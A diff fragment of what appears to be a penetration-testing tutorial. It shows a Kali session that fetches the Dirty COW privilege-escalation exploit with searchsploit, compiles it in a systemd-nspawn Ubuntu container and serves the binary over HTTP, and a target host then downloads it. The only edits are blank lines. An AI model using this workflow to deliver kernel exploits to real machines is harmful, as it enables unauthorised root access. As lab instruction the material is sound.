@@ -51,6 +51,7 @@ Ideally, we want to keep the files on the containers root directory for easy acc
 root@kali:~$ cd /var/lib/machines/Xenial/root
 
 root@kali:/var/lib/machines/Xenial/root$ searchsploit -m 40839
+
   Exploit: Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)
       URL: https://www.exploit-db.com/exploits/40839
      Path: /usr/share/exploitdb/exploits/linux/local/40839.c
@@ -60,14 +61,18 @@ File Type: C source, ASCII text
 Copied to: /var/lib/machines/compiler/root/40839.c
 
 root@kali:/var/lib/machines/Xenial/root$ systemd-nspawn -M Xenial
+
 Spawning container Xenial on /var/lib/machines/Xenial.
 Press ^] three times within 1s to kill container.
+
 root@Xenial:~$ gcc -pthread 40839.c -o dirty -lcrypt
+
 root@Xenial:~$ exit
 logout
 Container Xenial exited successfully.
 
 root@kali:/var/lib/machines/Xenial/root$ python -m http.server 80
+
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 192.168.1.20 - - "GET /dirty HTTP/1.1" 200 -
 ```
